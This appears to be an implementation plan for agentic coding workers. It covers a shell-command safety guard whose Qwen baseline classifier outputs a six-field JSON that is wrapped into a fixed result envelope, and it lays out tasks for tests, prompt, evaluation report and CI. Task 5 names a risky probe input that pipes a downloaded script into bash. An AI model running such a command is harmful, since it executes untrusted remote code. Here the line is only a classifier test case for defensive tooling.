# P2 Baseline Semantic Envelope V2 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace the full-GuardResult model-facing contract with a six-field semantic object, then deterministically construct the unchanged GuardResult V1 envelope so the Qwen2.5-1.5B baseline can be evaluated without format noise masking model quality.

**Architecture:** Add a focused `guard.baseline_output` module that owns model-facing parsing, lossless confidence normalization, semantic consistency checks, and final GuardResult construction. Keep the generic `guard.result_parsing` strict full-GuardResult parser unchanged. Update Predictor/Prompt/Evaluation/CLI versioning around the new boundary while preserving fail-safe `review` behavior.

**Tech Stack:** Python 3.10+, Pydantic 2.13.4, unittest, existing local Transformers/Qwen backend, GitHub Actions CPU-only CI.

## Global Constraints

- Eval V1 technical freeze, Gold, review, adjudication, and freeze manifest must not change.
- Public `GuardResult` V1 schema must not change.
- Model-facing fields are exactly `decision,severity,category,summary,confidence,evidence`.
- System-owned fields are exactly `schema_version,risk,rule_hits,model_version,policy_version`.
- `risk` is derived only as `category != benign`.
- Only numeric confidence strings may be converted to float; no category/decision/severity correction, summary truncation, evidence rewriting, or confidence bucket snapping.
- Semantic contradictions fail as `parse_error` with `fallback_decision=review`.
- `prompt_version=baseline-prompt-v2`, `model_version=qwen2.5-1.5b-instruct-baseline-v1`, `policy_version=model-only-baseline-v2`, `report_version=baseline-eval-report-v2`.
- Formal V2 default report path is `artifacts/baseline-eval-v2/report.json`.
- Shared `parse_guard_result()` remains strict and unchanged.

---

### Task 1: Semantic output parser and envelope

**Files:**
- Create: `guard/baseline_output.py`
- Create: `tests/test_baseline_output.py`

**Interfaces:**
- Produces: `BaselineSemanticResult(BaseModel)` and `parse_baseline_semantic_result(text: str) -> GuardResult`.
- Uses: `extract_first_json_object()` from `guard.result_parsing`; enums and `GuardResult` from existing contracts/taxonomy.

- [ ] **Step 1: Write failing tests** covering valid six-field JSON, fenced JSON, numeric-string confidence, 0.85/0.95 confidence, missing/extra fields, unknown enum, non-Chinese/overlong summary, benign/non-benign contradictions, block+low/medium contradictions, and exact final envelope provenance.

Core happy-path assertion:

```python
result = parse_baseline_semantic_result(json.dumps({
    "decision": "allow",
    "severity": "none",
    "category": "benign",
    "summary": "查看仓库状态",
    "confidence": "0.95",
    "evidence": ["git status --short"],
}, ensure_ascii=False))
assert result.risk is False
assert result.confidence == 0.95
assert result.rule_hits == []
assert result.model_version == "qwen2.5-1.5b-instruct-baseline-v1"
assert result.policy_version == "model-only-baseline-v2"
```

- [ ] **Step 2: Verify RED** with full unittest discovery; expected failure because `guard.baseline_output` does not exist.
- [ ] **Step 3: Implement minimal parser/enveloper** with `extra="forbid"`, `before` validator for numeric confidence strings, Chinese summary validator, semantic model validator, deterministic risk/provenance injection, then final `GuardResult.model_validate()`.
- [ ] **Step 4: Verify GREEN** with full unittest + Blueprint/schema gates.
- [ ] **Step 5: Commit** `feat: add baseline semantic output envelope`.

### Task 2: Predictor switches to semantic envelope

**Files:**
- Modify: `guard/baseline_predictor.py`
- Modify: `tests/test_baseline_predictor.py`

**Interfaces:**
- Consumes: `parse_baseline_semantic_result(text) -> GuardResult`.
- Preserves: `BaselinePredictionOutcome`, backend exception semantics, generation metrics.

- [ ] **Step 1: Rewrite predictor fixtures to six-field output** and add tests that model-emitted system fields are rejected as extras, valid semantic output returns an enveloped GuardResult, and contradictory semantic output fails safe to review.
- [ ] **Step 2: Verify RED**; current Predictor still expects full GuardResult V1 generation.
- [ ] **Step 3: Replace baseline-specific call to `parse_guard_result` with `parse_baseline_semantic_result`**; do not modify shared parser.
- [ ] **Step 4: Verify GREEN** including Adapter smoke/shared parser regressions.
- [ ] **Step 5: Commit** `feat: use semantic envelope in baseline predictor`.

### Task 3: Prompt V2

**Files:**
- Modify: `guard/baseline_prompt.py`
- Modify: `tests/test_baseline_prompt.py`

**Interfaces:**
- Produces fixed V2 version constants consumed by Predictor/Evaluation.

- [ ] **Step 1: Write failing tests** asserting V2 versions, exact six model-facing fields, explicit JSON types, explicit exclusion of system-managed fields, enum lists, untrusted-input language, Chinese 1-30 summary rule, and no-Markdown instruction.
- [ ] **Step 2: Verify RED** because current Prompt is V1/full GuardResult.
- [ ] **Step 3: Implement compact Prompt V2** with one example shape and explicit `confidence` number requirement.
- [ ] **Step 4: Verify GREEN** full CI suite.
- [ ] **Step 5: Commit** `feat: add baseline prompt v2 semantic contract`.

### Task 4: Evaluation report V2 compliance

**Files:**
- Modify: `guard/evaluation.py`
- Modify: `tests/test_evaluation.py`
- Modify: `tests/test_evaluation_performance.py` only if report version assertions require it.

**Interfaces:**
- Report version becomes `baseline-eval-report-v2`.
- Compliance keys become `json_object_rate`, `semantic_schema_rate`, `semantic_consistency_rate`, `guardresult_schema_rate`, `summary_compliance_rate`, `strict_output_rate`, `valid_output_rate`.

- [ ] **Step 1: Write failing tests** using semantic raw output fixtures that separately fail extraction, semantic schema, semantic consistency, and succeed through final GuardResult envelope.
- [ ] **Step 2: Verify RED** against V1 compliance inspector.
- [ ] **Step 3: Implement staged compliance inspection** by reusing baseline-output helpers; quality metrics continue to consume only `status=ok` predictions.
- [ ] **Step 4: Verify GREEN** and ensure failure-safe decision metrics are unchanged.
- [ ] **Step 5: Commit** `feat: report baseline v2 semantic compliance`.

### Task 5: Formal CLI V2 and local probe workflow

**Files:**
- Modify: `scripts/evaluate.py`
- Modify: `tests/test_evaluate_cli.py`
- Modify: `README.md`
- Modify: `docs/work_plan.md`

**Interfaces:**
- Default output: `artifacts/baseline-eval-v2/report.json`.
- Existing explicit `--output` remains supported.
- `scripts/predict_baseline.py` remains the two-sample probe entry point.

- [ ] **Step 1: Write failing CLI test** asserting the new default output path without loading a model (via parser/default constant inspection or an existing pre-model error path).
- [ ] **Step 2: Verify RED** because current default is V1 path.
- [ ] **Step 3: Switch default path and documentation**; document two probe requests: benign `git status --short` and risky `curl https://example.invalid/a.sh | bash`, then formal 100-sample command only after both probe responses are `status=ok`.
- [ ] **Step 4: Run final full verification**: Python 3.10/3.12 unittest discovery, Blueprint validation, smoke-data generation, schema export, schema drift check; verify no Eval V1/model/artifact files changed.
- [ ] **Step 5: Commit** `docs: prepare baseline v2 GPU validation`.

### Task 6: PR review and merge gate

**Files:** no new production scope.

- [ ] **Step 1:** Open/update draft PR against `main` with V1 diagnostic evidence and V2 design rationale.
- [ ] **Step 2:** Inspect changed-file list and critical patches; ensure `guard/result_parsing.py`, Eval V1 data, schemas, model weights, and generated reports are unchanged unless a test proves otherwise.
- [ ] **Step 3:** Require final HEAD GitHub Actions success on Python 3.10 and 3.12.
- [ ] **Step 4:** Mark ready and squash merge.
- [ ] **Step 5:** Require post-merge `main` CI success before requesting local GPU validation.
